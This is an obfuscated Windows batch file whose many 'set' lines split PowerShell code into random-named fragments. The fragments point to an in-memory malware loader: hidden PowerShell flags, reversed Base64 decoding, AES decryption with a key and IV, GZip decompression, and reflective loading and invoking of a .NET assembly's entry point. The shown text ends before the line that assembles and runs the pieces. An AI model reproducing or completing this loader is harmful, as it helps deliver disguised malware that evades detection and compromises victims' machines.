@echo off
set "TaGWYemPfC=bjec"
set "VomrHkepBQ=DNvf"
set "IpBjdPvutR=]::("
set "AhrRjjLsoB=-nop"
set "OyefbfLctI=stem"
set "FwWGFeiMfL=CVl "
set "jjrUZoCcfa=$DNv"
set "GMIBSTvYUa=S.En"
set "GtDSWdTbTR=comp"
set "TImKbgSKPI=pDZz"
set "PqhNsRwLxs=Bmor"
set "xcoeAIKrfa=tsWi"
set "GmxmuWMLPc=).Sp"
set "zSXKAqbMYW=OyzA"
set "udHHfottjR=ateD"
set "NQYfdVxELI=stem"
set "QBvzPPwMmL=-Obj"
set "PZVdySZPfw=mory"
set "tXntkHQtLH=('%*'"
set "NVMCGrQZNU=ect "
set "KQqzChOVRB=bc ="
set "PosSJDkVEi= [Sy"
set "DQFrwkLMwP=lit("
set "MPyPmkYDvJ=[IO."
set "ZXxJbXxRjE=bstr"
set "VWqmGuDkBn=saBm"
set "KURcXYWwnF=esaB"
set "KdCViCreRC=rtS4"
set "PCQYjIVnJw=Stre"
set "AUzojTUGsv=brea"
set "DoYfZZonLK=Gdsw"
set "VfhDRPLjAm=Srsc"
set "CkoBgQYSpK=morF"
set "OJCgWDKSsO=e]::"
set "dqhrEkKAFP=.Con"
set "vddufWjidS=ZYYc"
set "nwVGzlkhQe=join"
set "hvwQcOOYnP=6esa"
set "bzDxaKOutM=tion"
set "vzzrGDXfrb=onve"
set "GxVJBOkWVv=AUS "
set "vgMRBrQtNs=)($t"
set "oGeRPBQCRo=nSLJ"
set "kChcBYGojB=]::C"
set "YjqKQaKmBl=[Env"
set "BPWgRJuHif=[Sys"
set "SgHSbCvsiO=);$T"
set "VjhhmAqNju=Obje"
set "NYGGGEeUaj=pw.D"
set "uaDnOefmsA= = N"
set "upeOmaTYzQ= [st"
set "elaUKLCoUK=;$VM"
set "AEpPUpySER=nSLJ"
set "qXFwLJRzPQ=ne);"
set "aBYmzIRNkM=[]] "
set "bXbhHeyYsa=orF'"
set "hhpgIzFjWQ=rofi"
set "NKMpoGoJKZ=.Cop"
set "GtcgRxtMxQ=ress"
set "ttcwOKYbEI=3); "
set "jsTOwoJbZz=Gdsw"
set "jQJsOLszLi=;$zn"
set "SraeDeWaXs=$LHr"
set "qXAFaMsZWL=Disp"
set "tPIRtJxCeW=[-1."
set "BLkNiMEwTr=m.Re"
set "vwBHjTNVkI=vert"
set "fOZXWdUDdP=hy.A"
set "FxeRoxLlFM=.-16"
set "JCZwyLRzMs=$wfu"
set "emniwTofav=w, 0"
set "deFYyCkWaa=wfup"
set "rOtoKxvcvH=rans"
set "wLgWNHJjch=comm"
set "YKDBXTKLZS=-1.."
set "iDWNWDsMFj=($qW"
set "vsJKCGZoyE= if "
set "TyJKmTRgHs='[-1"
set "VvjeYEMGbA=F'[-"
set "EqlwuQVEng=tGds"
set "JoHKFfTNhZ=iron"
set "BejISSDjHR=[Sys"
set "drNjbCrJcA=y.Pa"
set "rwIBAHMGhq=ode]"
set "lGebDNkLhI=i) {"
set "RiFltMtjPm=Fina"
set "EvZuEvyDQs=g = "
set "MKymoJmHjJ=tryP"
set "JpgPOzuieb=.GZi"
set "WUhXHdQOya=null"
set "AJSZkYmEOy=Okgt"
set "nkWgkCSRmq=$tGd"
set "ALosGYrjiG=1] -"
set "cdqCxnzkYx=();$"
set "isMtfBWrEE=.Key"
set "bpkgxoEaZy=Secu"
set "KEuETPQqQN=J.Pa"
set "bCzLkdZexP=oArr"
set "CwaURKopuO=gth)"
set "OZFhNqqHAj=em.C"
set "FrpgZaEftk=ct S"
set "xfPoPgTAuW=l.Su"
set "BFszFBiNmd=y.Ci"
set "QjFSofBfyN=$Tqe"
set "eZvqQmOGLJ=-joi"
set "kcQcfYwFTl='[-1"
set "EJSTAZhkFr=pres"
set "JXcKuRKdjX=Srsc"
set "fGGzGMmsSx=-joi"
set "dpBgpnjjtC=se()"
set "tbxmhmhFLy=nirt"
set "jfIFdxYsyC=, $t"
set "zIbwshemVl=nage"
set "RpbHwEIWUm=m.IO"
set "sSNmbjlJkh=esMa"
set "GdfjbYXjpa=w = "
set "baZHNnUCky=kgt."
set "YwnAdmxmMb=$tGd"
set "XTgWjYOwCa==');"
set "djsCgjGSJh=in $"
set "GELmFSHEiK=nSLJ"
set "UavODwEcQM=]::("
set "DqgIQlttzi=;$zn"
set "imtIPIQzQT=UGTu"
set "wyqCueyrzy=eam("
set "EUKWtONsJd=Ly.T"
set "mAjDtpjULq=ewLi"
set "zDgXkPVTNx=TllA"
set "uyfXVZqnlf=th('"
set "hPOUQgeHSz= '')"
set "dOFToywzqt=Disp"
set "WOWGsEthJQ=oryS"
set "KvosUYIFGN=x = "
set "BZDWrfcJGU='txe"
set "EZfEfEWFOG=fx, "
set "iPBZFqMZms=le  "
set "bCDnzNqkLe=oL'["
set "maYGVxNDFP=.Mod"
set "LcIgNdpVnX=O.Me"
set "wToCfsAzhx=v4Ir"
set "XjchgfRMJB=('da"
set "exmauQpxmL=Invo"
set "BAlwFwXHJG=();$"
set "LXaHynGBjm=n ''"
set "pMrUQkJCZU=sGUc"
set "gIFRhFzaBw=tem."
set "MNlYYBPNfN=  $G"
set "JWeyxWRwLf=] -j"
set "hXBGtsZTVo=Syst"
set "LnYcqVrlOE=)($G"
set "yZmInrmbca=ct S"
set "UEWNyyobTd=.Cry"
set "jgrNNDfPwF=ach "
set "yNrJGtYQxl=form"
set "qnjsLWMeRR=embl"
set "sqaBWQaiTy= '')"
set "UIhRSmcWFd=wi ="
set "thgRAKIXvD= = ["
set "WfIMOoNAxY=tGds"
set "WaWMRuuGoJ=.Sec"
set "NAyfeBbtLo=-ep "
set "SGlPjVKcKw== [S"
set "YGdfnHNWXa===')"
set "pZHwZBqzMc=Comp"
set "ZKMjAgkcmG=-4] "
set "RaRYBPKkXi=isfL"
set "gQiwGsnKpp=NLy "
set "fuIKOUihFg=raph"
set "QrREOPvFVA=($qW"
set "KNjDJyakLP=flec"
set "BZemeIdYeD=w = "
set "XOfsFePkty=3HWs"
set "kmgAthizSi=NLy."
set "hfIrquEhLD= [Sy"
set "FqfCFdGyat=::('"
set "dIbAIBBtCq=ecry"
set "ZRaRfhGaFy=ert]"
set "gVlAnAvuqo=rt]:"
set "ziHKnbFYrk=('l0"
set "eosQUZmCUe=ment"
set "sTNxXTIgAB=d;$y"
set "TExMjbSOXH=yste"
set "EbdkawqMJI=LHrw"
set "vQxQrtbGcu=bc.T"
set "rLbceQTKlx=trea"
set "UTDtkTOfUm=S46e"
set "qEiDWBDTsn=k; }"
set "TvfxsfoQmr=ptor"
set "IdaFKsRdVa=7;$y"
set "ZIHSwzfpoi=e = "
set "jfUzCOldCp=t Sy"
set "mLzYVmokrt=tS46"
set "sIUCJvGuLR=V = "
set "VpWMzZhKrZ== $y"
set "dpcwBqUxBC=tem."
